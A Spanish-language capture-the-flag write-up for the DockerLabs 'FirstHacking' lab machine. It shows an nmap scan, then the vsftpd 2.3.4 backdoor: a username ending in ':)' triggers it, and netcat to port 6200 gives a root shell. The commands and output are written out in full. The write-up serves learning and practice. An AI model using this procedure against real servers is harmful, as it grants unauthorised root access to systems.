# Writeup: FirstHacking - DockerLabs

- **Máquina:** FirstHacking (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/22/descargar
- **Dificultad:** Muy Fácil
- **Fecha:** 19 de Octubre 2026

---

## Objetivo
Explotar la backdoor de vsftpd 2.3.4 y obtener acceso como `root`.

---

## 1. Reconocimiento
Utilizo `nmap` para el escaneo de puertos y el parámetro `-sCV` para obtener sus versiones. Esto revela un único puerto abierto:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```
---

## 2. Identificación de vulnerabilidades
La versión **vsftpd 2.3.4** puede ser comprometida al ingresar los caracteres `:)` en el nombre de usuario al momento de hacer el login FTP. Esto abre una backdoor en el puerto 6200 con posible acceso a privilegios `root`.

---
## 3. Explotación
### 1. Activar backdoor con FTP
El nombre **usuario:)** contiene los caracteres necesarios para la activación, introducimos cualquier contraseña y enviamos. 
```bash
FTP 172.17.0.2
```
```bash
Connected to 172.17.0.2
220 (vsFTPd 2.3.4)
Name (172.17.0.2:kali): usuario:)
331 Please specify the password.
Password:
```

### 2. Conectarse a la Shell
Una vez activa la backdoor, el puerto 6200 queda abierto con una shell `root`. Uso `netcat` para acceder a ella:
```bash
netcat 172.17.0.2 6200
whoami
root
```
Una vez hecho esto, logré obtener privilegios `root`.

---
## Conclusión
FirstHacking es una máquina introductoria al escaneo de puertos y sus versiones, además de la explotación de vulnerabilidades ya documentadas. Esto demuestra lo peligroso que puede ser mantener software desactualizado.
